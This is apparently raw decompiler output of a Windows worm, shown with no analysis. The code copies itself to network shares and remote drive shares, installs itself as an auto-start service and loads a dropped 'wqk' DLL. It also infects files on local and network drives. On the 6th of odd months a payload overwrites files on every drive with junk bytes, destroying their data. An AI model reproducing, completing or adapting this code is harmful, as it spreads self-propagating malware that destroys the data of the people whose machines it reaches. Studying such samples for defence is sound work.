  result = 0;
  v19 = 0;
  v20 = 0;
  nSize = 32;
  v22 = 0;
  v23 = 0;
  if ( !dword_491E88 )
  {
    if ( dword_491EA0 )
    {
      if ( !lpMultiByteStr
        || (GetComputerNameA(Buffer, &nSize), (result = (const char *)_strcmpi(lpMultiByteStr + 2, Buffer)) != 0) )
      {
        v16[4] = -1;
        v16[6] = (int)v11;
        v16[0] = (int)v9;
        v16[2] = (int)v9;
        v16[1] = 0;
        v16[5] = 0;
        v16[7] = 0;
        v16[3] = 127;
        strcat(Destination, Buffer);
        MultiByteToWideChar(0, 1u, lpMultiByteStr, -1, WideCharStr, 34);
        for ( i = 2; i < 5; ++i )
        {
          MultiByteStr[0] = i + 65;
          MultiByteToWideChar(0, 1u, MultiByteStr, -1, v11, 20);
          Destination[0] = MultiByteStr[0];
          MultiByteToWideChar(0, 1u, Destination, -1, v9, 52);
          result = (const char *)dword_491EA0(WideCharStr, 2, v16, &v22);
          v21 = result;
          if ( a2 )
          {
            if ( !result && !v23 )
            {
              v3 = rand();
              sub_404156((char *)&phkResult, v3 % 2, &byte_40F1DC, 1);
              strcpy(v7, asc_40E044);
              strcat(v7, Destination);
              result = (const char *)sub_40280F(lpMultiByteStr, v7, 0, &phkResult, 0, 1);
              v23 = result;
            }
            if ( !v21 )
            {
              v4 = sub_404687(0);
              sub_404156(Source, v4 & 1, &String2, 1);
              strcpy(FileName, lpMultiByteStr);
              strcat(FileName, asc_40E044);
              strcat(FileName, Destination);
              strcat(FileName, asc_40E044);
              strcat(FileName, Source);
              result = sub_406A68(FileName, -1, -1, 1);
            }
          }
        }
      }
    }
  }
  return result;
}
// 491E88: using guessed type int dword_491E88;
// 491EA0: using guessed type int (__stdcall *dword_491EA0)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406688) --------------------------------------------------------
int __cdecl sub_406688(LPNETRESOURCEA lpNetResource, DWORD dwScope, int a3)
{
  int result; // eax
  const char **v4; // esi
  char v5; // al
  char v6; // al
  char Buffer[20]; // [esp+4h] [ebp-439Ch] BYREF
  char v8; // [esp+18h] [ebp-4388h] BYREF
  struct HKEY__ phkResult; // [esp+3E84h] [ebp-51Ch] BYREF
  char Source[260]; // [esp+3F88h] [ebp-418h] BYREF
  char v11[260]; // [esp+408Ch] [ebp-314h] BYREF
  CHAR MachineName[260]; // [esp+4190h] [ebp-210h] BYREF
  char Destination[260]; // [esp+4294h] [ebp-10Ch] BYREF
  DWORD BufferSize; // [esp+4398h] [ebp-8h] BYREF
  DWORD cCount; // [esp+439Ch] [ebp-4h] BYREF
  LPNETRESOURCEA lpNetResourcea; // [esp+43A8h] [ebp+8h]

  cCount = -1;
  BufferSize = 16000;
  result = WNetOpenEnumA(dwScope, 1u, 3u, lpNetResource, (LPHANDLE)&dwScope);
  if ( !result )
  {
    WNetEnumResourceA((HANDLE)dwScope, &cCount, Buffer, &BufferSize);
    lpNetResourcea = 0;
    if ( cCount )
    {
      v4 = (const char **)&v8;
      do
      {
        if ( (*(_BYTE *)(v4 - 2) & 2) != 0 )
        {
          sub_406688((LPNETRESOURCEA)(v4 - 5), 2u, a3);
        }
        else if ( !sub_404A85((int)*v4, MachineName, v11) )
        {
          sub_40644E(MachineName, a3);
          v5 = sub_404687(0);
          sub_404156((char *)&phkResult, v5 & 1, &byte_40F1DC, 1);
          if ( a3 )
          {
            sub_40280F(MachineName, v11, 0, &phkResult, 0, 1);
            v6 = sub_404687(0);
            sub_404156(Source, v6 & 1, &String2, 1);
            strcpy(Destination, *v4);
            strcat(Destination, asc_40E044);
            strcat(Destination, Source);
            sub_406A68(Destination, -1, -1, 1);
          }
        }
        lpNetResourcea = (LPNETRESOURCEA)((char *)lpNetResourcea + 1);
        v4 += 8;
      }
      while ( (unsigned int)lpNetResourcea < cCount );
    }
    return WNetCloseEnum((HANDLE)dwScope);
  }
  return result;
}
// 406688: using guessed type char Buffer[20];

//----- (00406801) --------------------------------------------------------
void __stdcall __noreturn sub_406801(LPVOID lpThreadParameter)
{
  int i; // eax

  for ( i = 1; ; i = 0 )
  {
    sub_406688(0, 2u, i);
    Sleep(0x1B7740u);
  }
}

//----- (00406820) --------------------------------------------------------
int sub_406820()
{
  unsigned int v0; // eax
  char *v1; // eax
  HMODULE LibraryA; // ebp
  FARPROC ProcAddress; // eax
  SC_HANDLE v5; // ebp
  SC_HANDLE v6; // edi
  SC_HANDLE hSCObject; // [esp+10h] [ebp-1FC8h]
  SC_HANDLE hSCObjecta; // [esp+10h] [ebp-1FC8h]
  CHAR Filename[260]; // [esp+14h] [ebp-1FC4h] BYREF
  char Str[7872]; // [esp+118h] [ebp-1EC0h] BYREF

  GetModuleFileNameA(0, Filename, 0x104u);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  hSCObject = (SC_HANDLE)CopyFileA(Filename, (LPCSTR)&ApplicationName, 0);
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x20u);
  if ( hSCObject )
  {
    memcpy(Str, &String1, sizeof(Str));
    Str[4116] = 0;
    sub_4054B3((LPCSTR)&ApplicationName, Str);
    sub_404E60((LPCSTR)&ApplicationName, 77824);
    v0 = sub_404687(0);
    sub_403F63((LPCSTR)&ApplicationName, v0 % 0x2800 + 78336);
  }
  SetFileAttributesA((LPCSTR)&ApplicationName, 0x27u);
  if ( dword_491E88 )
  {
    sub_40451C(HKEY_LOCAL_MACHINE, Destination, ServiceName, &ApplicationName);
    v1 = sub_403434(LibFileName, 1);
    LibraryA = LoadLibraryA(v1);
    ProcAddress = GetProcAddress(LibraryA, ProcName);
    if ( ProcAddress )
      ((void (__stdcall *)(_DWORD, int))ProcAddress)(0, 1);
    FreeLibrary(LibraryA);
  }
  if ( !hSCObject )
    return 0;
  if ( dword_491E88 )
  {
    sub_4046B3((LPCSTR)&ApplicationName, 0);
  }
  else if ( !dword_491E90 )
  {
    hSCObjecta = OpenSCManagerA(0, 0, 2u);
    CreateServiceA(hSCObjecta, ServiceName, ServiceName, 0, 0x110u, 2u, 0, (LPCSTR)&ApplicationName, 0, 0, 0, 0, 0);
    CloseServiceHandle(hSCObjecta);
    v5 = OpenSCManagerA(0, 0, 1u);
    v6 = OpenServiceA(v5, ServiceName, 0x10u);
    StartServiceA(v6, 0, 0);
    CloseServiceHandle(v6);
    CloseServiceHandle(v5);
  }
  return 1;
}
// 491E88: using guessed type int dword_491E88;
// 491E90: using guessed type int dword_491E90;

//----- (004069A4) --------------------------------------------------------
DWORD __stdcall sub_4069A4(LPVOID lpThreadParameter)
{
  UINT DriveTypeA; // eax
  CHAR RootPathName[4]; // [esp+0h] [ebp-4h] BYREF

  strcpy(RootPathName, "a:\\");
  RootPathName[0] = (_BYTE)lpThreadParameter + dword_411088;
  DriveTypeA = GetDriveTypeA(RootPathName);
  if ( DriveTypeA == 3 || DriveTypeA == 4 )
  {
    while ( 1 )
    {
      sub_403E11(RootPathName, (int)sub_405A0E, 0);
      Sleep(0x1B77400u);
    }
  }
  return 1;
}
// 411088: using guessed type int dword_411088;

//----- (004069F1) --------------------------------------------------------
DWORD __stdcall sub_4069F1(LPVOID lpThreadParameter)
{
  char *v1; // eax
  char Source[300]; // [esp+4h] [ebp-258h] BYREF
  char Destination[300]; // [esp+130h] [ebp-12Ch] BYREF

  strcpy(Destination, SubKey);
  v1 = sub_403434(SubKey, 7);
  strcat(Destination, v1);
  Source[0] = 0;
  sub_4044C0(HKEY_LOCAL_MACHINE, Destination, asc_40FDCC, (LPBYTE)Source, (HKEY)0x12C);
  sub_403E11(Source, (int)sub_405A0E, 0);
  return 0;
}

//----- (00406A68) --------------------------------------------------------
const char *__cdecl sub_406A68(LPCSTR lpFileName, int a2, int a3, int a4)
{
  const char *result; // eax
  unsigned int v6; // eax
  char *v7; // eax
  char *v8; // eax
  char Str[7872]; // [esp+10h] [ebp-21D4h] BYREF
  CHAR Filename[260]; // [esp+1ED0h] [ebp-314h] BYREF
  char Destination[260]; // [esp+1FD4h] [ebp-210h] BYREF
  CHAR NewFileName[260]; // [esp+20D8h] [ebp-10Ch] BYREF
  int v13; // [esp+21DCh] [ebp-8h]
  int v14; // [esp+21E0h] [ebp-4h]
  unsigned int v15; // [esp+21F0h] [ebp+Ch]
  unsigned int v16; // [esp+21F0h] [ebp+Ch]

  v14 = a2;
  v13 = a3;
  if ( a4 || (result = sub_4046F6(lpFileName)) == 0 )
  {
    v15 = sub_403464(a2_0, 0);
    if ( a2 < 0 )
      v14 = sub_404687(0) % v15;
    v16 = sub_403464(&byte_40F1DC, 0);
    if ( a3 < 0 )
      v13 = sub_404687(0) % v16;
    sub_403D8C(NewFileName);
    GetModuleFileNameA(0, Filename, 0x104u);
    result = (const char *)CopyFileA(Filename, NewFileName, 0);
    if ( result )
    {
      SetFileAttributesA(NewFileName, 0x20u);
      memcpy(Str, &String1, sizeof(Str));
      Str[4116] = 0;
      sub_4054B3(NewFileName, Str);
      v6 = sub_404687(0);
      sub_403F63(NewFileName, v6 % 0x2800 + 78336);
      v7 = sub_403434(a2_0, v14);
      strcpy(Destination, v7);
      v8 = sub_403434(&byte_40F1DC, v13);
      strcat(Destination, v8);
      sub_4050C1(lpFileName, NewFileName, Destination, a4);
      return (const char *)sub_403DFA(NewFileName);
    }
  }
  return result;
}

//----- (00406BDF) --------------------------------------------------------
int __cdecl sub_406BDF(LPCSTR lpFileName, int a2)
{
  int v2; // ebx
  char *v3; // eax
  CHAR *FileA; // eax
  DWORD FileSize; // eax
  int v6; // ebx
  unsigned int v7; // ebx
  char Ext[260]; // [esp+Ch] [ebp-11Ch] BYREF
  char v10[16]; // [esp+110h] [ebp-18h] BYREF
  unsigned int v11; // [esp+120h] [ebp-8h]
  DWORD FileSizeHigh; // [esp+124h] [ebp-4h] BYREF
  CHAR *lpFileNamea; // [esp+130h] [ebp+8h]
  int v14; // [esp+134h] [ebp+Ch]
  int v15; // [esp+134h] [ebp+Ch]

  sub_40174B(v10);
  if ( !a2 )
  {
    Sleep(0);
    if ( dword_491E94 )
      goto LABEL_7;
    v14 = sub_403464(&byte_40F1FC, 0);
    _splitpath(lpFileName, 0, 0, 0, Ext);
    v2 = 0;
    if ( v14 > 0 )
    {
      do
      {
        v3 = sub_403434(&byte_40F1FC, v2);
        if ( !_strcmpi(Ext, v3) )
          break;
        ++v2;
      }
      while ( v2 < v14 );
      if ( v2 < v14 )
      {
LABEL_7:
        SetFileAttributesA(lpFileName, 0x20u);
        FileA = (CHAR *)CreateFileA(lpFileName, 0xC0000000, 1u, 0, 3u, 0x20u, 0);
        lpFileNamea = FileA;
        if ( FileA != (CHAR *)-1 )
        {
          FileSize = GetFileSize(FileA, &FileSizeHigh);
          v11 = FileSize;
          if ( FileSizeHigh )
            v6 = 0x2000;
          else
            v6 = FileSize >> 19;
          memset(byte_411970, v6, 0x64u);
          SetFilePointer(lpFileNamea, 0, 0, 0);
          if ( v6 > 0 )
          {
            v15 = v6;
            do
            {
              WriteFile(lpFileNamea, byte_411970, 0x80000u, &FileSizeHigh, 0);
              --v15;
            }
            while ( v15 );
          }
          v7 = v6 << 19;
          if ( v7 < v11 )
            WriteFile(lpFileNamea, byte_411970, v11 - v7, &FileSizeHigh, 0);
          CloseHandle(lpFileNamea);
        }
      }
    }
  }
  return 1;
}
// 491E94: using guessed type int dword_491E94;
// 406BDF: using guessed type char var_18[16];

//----- (00406D1C) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  UINT DriveTypeA; // eax
  CHAR RootPathName[4]; // [esp+0h] [ebp-4h] BYREF

  strcpy(RootPathName, "a:\\");
  RootPathName[0] = (_BYTE)lpThreadParameter + dword_411088;
  DriveTypeA = GetDriveTypeA(RootPathName);
  if ( DriveTypeA == 3 || DriveTypeA == 4 )
  {
    while ( 1 )
      sub_403E11(RootPathName, (int)sub_406BDF, 0);
  }
  return 1;
}
// 411088: using guessed type int dword_411088;

//----- (00406D5E) --------------------------------------------------------
int sub_406D5E()
{
  signed int i; // esi
  int result; // eax

  for ( i = 1; i < 3000; ++i )
    result = sub_4013FA(i, 1);
  return result;
}

//----- (00406D75) --------------------------------------------------------
void __noreturn sub_406D75()
{
  int i; // esi
  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-14h] BYREF
  DWORD ThreadId; // [esp+1Ch] [ebp-4h] BYREF

  while ( 1 )
  {
    do
    {
      do
      {
        Sleep(0x927C0u);
        GetLocalTime(&SystemTime);
      }
      while ( (SystemTime.wMonth & 1) == 0 );
    }
    while ( SystemTime.wDay != 6 );
    dword_491E94 = 0;
    dword_491E98 = 1;
    if ( SystemTime.wMonth == 7 )
      dword_491E94 = 1;
    if ( SystemTime.wMonth == 1 )
      dword_491E94 = 1;
    for ( i = 0; i < 26; ++i )
      CreateThread(0, 0, StartAddress, (LPVOID)i, 0, &ThreadId);
    Sleep(0x1B7740u);
    sub_406D5E();
    Sleep(0xFFFFFFFF);
  }
}
// 491E94: using guessed type int dword_491E94;
// 491E98: using guessed type int dword_491E98;

//----- (00406DFB) --------------------------------------------------------
DWORD __stdcall sub_406DFB(LPVOID lpThreadParameter)
{
  _BYTE *v1; // eax
  int v2; // esi
  BOOL i; // eax
  int v4; // eax
  CHAR Buffer[260]; // [esp+4h] [ebp-114h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+108h] [ebp-10h] BYREF
  char Source[12]; // [esp+10Ch] [ebp-Ch] BYREF

  sub_403D8C(Buffer);
  v1 = sub_407196(dword_40FF84, 0x1101u, &nNumberOfBytesToWrite);
  sub_403CBB(Buffer, v1, nNumberOfBytesToWrite);
  sub_4046B3(Buffer, 0);
  v2 = 0;
  for ( i = sub_403DFA(Buffer); !i; i = sub_403DFA(Buffer) )
  {
    Sleep(0x64u);
    v4 = v2++;
    if ( v4 > 100 )
      break;
  }
  memset(Source, 0, 0xAu);
  qmemcpy(Source, "wqk", 3);
  GetSystemDirectoryA(Buffer, 0x104u);
  strcat(Buffer, asc_40E044);
  strcat(Buffer, Source);
  if ( dword_491E88 )
  {
    strcat(Buffer, &byte_40F1DC);
    sub_4046B3(Buffer, 0);
  }
  else
  {
    strcat(Buffer, aDll);
    LoadLibraryA(Buffer);
  }
  return 0;
}
// 40FF84: using guessed type int dword_40FF84[1089];
// 491E88: using guessed type int dword_491E88;

//----- (00406F1C) --------------------------------------------------------
void __noreturn sub_406F1C()
{
  int i; // ebx
  DWORD ThreadId; // [esp+Ch] [ebp-4h] BYREF

  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4015FF, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406083, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_406801, 0, 0, &ThreadId);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_405DFA, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_406DFB, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_4069F1, 0, 0, &ThreadId);
  for ( i = 0; i < 26; ++i )
    CreateThread(0, 0, sub_4069A4, (LPVOID)i, 0, &ThreadId);
  sub_406D75();
}

//----- (00406FA6) --------------------------------------------------------
void __stdcall HandlerProc(DWORD dwControl)
{
  struct _SERVICE_STATUS ServiceStatus; // [esp+0h] [ebp-1Ch] BYREF

  ServiceStatus.dwServiceType = 272;
  memset(&ServiceStatus.dwControlsAccepted, 0, 20);
  ServiceStatus.dwCurrentState = 4;
  SetServiceStatus(hServiceStatus, &ServiceStatus);
  if ( sub_404AFC() )
    sub_406F1C();
}

//----- (00406FED) --------------------------------------------------------
void __stdcall sub_406FED(int a1, int a2)
{
  hServiceStatus = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
  HandlerProc(0);
}

//----- (0040700C) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct WSAData WSAData; // [esp+0h] [ebp-1A0h] BYREF
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+190h] [ebp-10h] BYREF
  int v7; // [esp+198h] [ebp-8h]
  int v8; // [esp+19Ch] [ebp-4h]

  WSAStartup(2u, &WSAData);
  if ( sub_4053AC() )
  {
    sub_406820();
    if ( !aO[0] || !sub_4058B1(aO) )
    {
      if ( dword_491E90 )
      {
        v7 = 0;
        v8 = 0;
        ServiceStartTable.lpServiceName = ServiceName;
        ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_406FED;
        StartServiceCtrlDispatcherA(&ServiceStartTable);
      }
      if ( sub_404AFC() )
        sub_406F1C();
    }
  }
  return 0;
}
// 491E90: using guessed type int dword_491E90;

//----- (00407087) --------------------------------------------------------
unsigned int *__cdecl sub_407087(int a1, size_t a2, int a3)
{
  void *v3; // ebx
  size_t v4; // esi
  size_t v6; // eax
  char *v7; // edi
  char v8; // cl
  size_t v9; // ecx
  unsigned int *v10; // esi
  size_t v11; // edi
  size_t v12; // ebx
  char Src[80000]; // [esp+8h] [ebp-1388Ch] BYREF
  void *v14; // [esp+13888h] [ebp-Ch]
  unsigned int v15; // [esp+1388Ch] [ebp-8h]
  size_t Size; // [esp+13890h] [ebp-4h]

  v3 = operator new(a2);
  v4 = 0;
  v14 = v3;
  v15 = 0;
  Size = 0;
  if ( !v3 )
    return 0;
  memset(Src, 0, sizeof(Src));
  v6 = 0;
  v7 = &Src[4];
  while ( v6 < a2 )
  {
    do
    {
      v8 = *(_BYTE *)(v6 + a1);
      if ( !v8 )
        break;
      *((_BYTE *)v3 + v4++) = v8;
      ++v6;
      Size = v4;
    }
    while ( v6 < a2 );
    if ( v6 >= a2 )
      break;
    v9 = v6;
    do
    {
      if ( *(_BYTE *)(v9 + a1) )
        break;
      ++v9;
    }
    while ( v9 < a2 );
    if ( v9 - v6 >= 0xA )
    {
      if ( v15 >= 0x2710 )
      {
        Size = v4;
        v10 = 0;
        goto LABEL_18;
      }
      ++v15;
      *((_DWORD *)v7 - 1) = v6;
      *(_DWORD *)v7 = v9 - v6;
      v7 += 8;
      v6 = v9;
    }
    else
    {
      while ( v6 < v9 )
      {
        *((_BYTE *)v3 + v4++) = *(_BYTE *)(v6 + a1);
        ++v6;
      }
    }
  }
  Size = v4;
  v11 = 2 * v15;
  v12 = 8 * v15 + v4 + 4;
  v10 = (unsigned int *)operator new(v12);
  *v10 = v15;
  memcpy(v10 + 1, Src, v11 * 4);
  memcpy(&v10[v11 + 1], v14, Size);
  *(_DWORD *)a3 = v12;
  v3 = v14;
LABEL_18:
  operator delete(v3);
  return v10;
}

//----- (00407196) --------------------------------------------------------
_BYTE *__cdecl sub_407196(int *a1, unsigned int a2, size_t *a3)
{
  size_t v4; // edx
  unsigned int v5; // edi
  _BYTE *result; // eax
  int *v7; // esi
  size_t v8; // ecx
  int v9; // eax
  unsigned int v10; // esi
  int *v11; // edi
  int v12; // ebx
  int *v13; // ecx
  unsigned int i; // edx
  unsigned int v15; // ecx
  _BYTE *v16; // esi
  int *v17; // [esp+Ch] [ebp-Ch]
  int v18; // [esp+10h] [ebp-8h]
  unsigned int v19; // [esp+14h] [ebp-4h]
  unsigned int v20; // [esp+14h] [ebp-4h]
  int v21; // [esp+20h] [ebp+8h]
  unsigned int v22; // [esp+24h] [ebp+Ch]

  v4 = 0;
  v5 = 8 * *a1;
  v19 = 0;
  v17 = a1 + 1;
  v18 = *a1;
  if ( a2 < v5 + 4 )
    return 0;
  if ( *a1 )
  {
    v7 = a1 + 1;
    v21 = *a1;
    do
    {
      if ( v4 < *v7 )
      {
        v8 = *v7 - v4;
        v4 = *v7;
        v19 += v8;
      }
      v9 = v7[1];
      if ( v9 )
        v4 += v9;
      v7 += 2;
      --v21;
    }
    while ( v21 );
  }
  v22 = a2 - v5 - 4;
  if ( v19 < v22 )
    v4 += v22 - v19;
  v10 = 0;
  v20 = 0;
  *a3 = v4;
  result = operator new(v4);
  v11 = &a1[v5 / 4 + 1];
  v12 = v18;
  if ( v18 )
  {
    v13 = v17;
    do
    {
      while ( v10 < *v13 )
        result[v10++] = *((_BYTE *)v11 + v20++);
      for ( i = 0; i < v13[1]; ++i )
        result[v10++] = 0;
      v13 += 2;
      --v12;
    }
    while ( v12 );
  }
  v15 = v20;
  if ( v20 < v22 )
  {
    v16 = &result[v10];
    do
      *v16++ = *((_BYTE *)v11 + v15++);
    while ( v15 < v22 );
  }
  return result;
}

//----- (00407B55) --------------------------------------------------------
int __cdecl sub_407B55(int a1)
{
  int result; // eax

  result = a1;
  dword_4110A0 = a1;
  return result;
}
// 4110A0: using guessed type int dword_4110A0;

//----- (0040BFCB) --------------------------------------------------------
int sub_40BFCB()
{
  return flsall(1);
}
// 40BFD4: using guessed type _DWORD __cdecl flsall(_DWORD);

// nfuncs=260 queued=131 decompiled=131 lumina nreq=0 worse=0 better=0
// ALL OK, 131 function(s) have been successfully decompiled
